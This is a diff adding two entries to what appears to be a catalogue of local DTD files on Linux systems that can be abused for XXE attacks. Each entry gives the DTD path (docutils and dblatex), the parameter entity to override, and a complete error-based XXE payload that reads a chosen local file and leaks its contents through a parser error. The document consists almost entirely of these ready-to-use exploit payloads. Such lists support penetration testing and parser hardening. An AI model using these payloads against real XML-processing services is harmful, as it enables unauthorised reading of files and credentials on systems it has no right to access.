@@ -440,3 +440,48 @@
 
  --- 
 
+**DTD File:** `/usr/share/xml/docutils/docutils.dtd`
+
+**Injectable entity:** `%measure`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd">
+
+    <!ENTITY % measure '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/dblatex/schema/dblatex-config.dtd`
+
+**Injectable entity:** `%attlist.modname`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/dblatex/schema/dblatex-config.dtd">
+
+    <!ENTITY % attlist.modname '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
